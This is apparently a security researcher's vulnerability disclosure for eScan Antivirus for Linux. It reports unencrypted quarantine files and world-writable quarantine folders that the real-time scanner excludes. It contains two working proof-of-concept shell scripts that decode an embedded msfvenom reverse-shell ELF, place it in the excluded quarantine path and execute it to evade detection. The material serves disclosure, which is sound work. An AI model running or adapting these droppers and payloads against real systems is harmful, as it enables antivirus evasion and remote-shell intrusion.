# Info

- **Product**: EScan Antivirus for Linux
- **Version**: 7.0.32
- **Environment**: Ubuntu 24.04.1
- **Researcher**: Nong Hoang Tu <tunh19@fpt.com>

*Note*: Escan was installed using Debian installer (`.deb` file). Different installation method can have different default settings.

# Quarantined malicious files are unencrypted
## Desciption and impact
`rtscanner` is a real-time protection service of Escan Antivirus for Linux. WHen a malicious file is detected, this service simply moves the file to quarantine folder without any encyption. This folder won't be monitored by real-time protection

## Steps to reprocedure
1. Create test file. Real time scanner will detect as malware

![image](https://github.com/user-attachments/assets/625a4271-6b39-497d-b436-77626dfae025)

2. Check new quarantined file. The file has the same content as created file.
![image](https://github.com/user-attachments/assets/12a7102f-414d-4c7f-8d70-c0a15a3d34f3)


# Incorect default permissions leads to malicious code evasion
## Description and impact
By default, quarantine folders of Escan Antivirus has permission 777. Any unprivileged user can change content inside these folders. A malware created in these folders will evade detection since reat-time scanner exludes these folders.

## Root cause
1. Incorrect default permissions: quaranties folders has permission 777. Any unprivileged users can modify data.

![image](https://github.com/user-attachments/assets/955c9c3c-4e19-43d0-aca3-8bdcf943dbe5)

2. By default, folder `/var/Microworld/` is excluded as a hardcoded part in `rtscanner`. Any malicious code executed in sub-folders of this path can evade real-time protection.

![image](https://github.com/user-attachments/assets/5ca6adbc-9d95-4091-8263-33ecc852def8)

## Step to reprocedure
Threat actor can select either any of these methods to drop malicious file, execute and evade reat-time detection system:
1. Dropper writes malware to quarantine folders, add execute permission if required, then execute malicious file inside quarantine folder. Exploit code example:

```
# msfvenom -f elf -o meter -p linux/x64/shell/reverse_tcp lhost=127.0.0.1 lport=8888
data="f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiuH8AAAFRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmomWg8FSIXAeO3/5g=="
path="/var/MicroWorld/var/quarantine/escan/malfile"

# Create malicious file
echo $data | base64 -d > $path
chmod 777 $path
$path
```

2. Dropper writes malware to any folder, wait antivirus moves malicious file to quarantine folder, add execute permission if required, then execute malicious file inside quarantine folder.

```
filename="hehehhaha"

# msfvenom -f elf -o meter -p linux/x64/shell/reverse_tcp lhost=127.0.0.1 lport=8888
data="f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiuH8AAAFRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmomWg8FSIXAeO3/5g=="
path="/var/MicroWorld/var/rtquarantine/"

# Create malicious file
echo $data | base64 -d > $filename

# Wait AV

sleep 3

# Try executing from quarantine
# First, get the last file was created inside quarantine folder
last_created_file="$(ls -t /var/MicroWorld/var/rtquarantine/ | head -n1)"
mal_file="${path}${last_created_file}"

# Change permission of quarantined file
chmod 777 ${mal_file}

# Execute last created file
${mal_file}
```
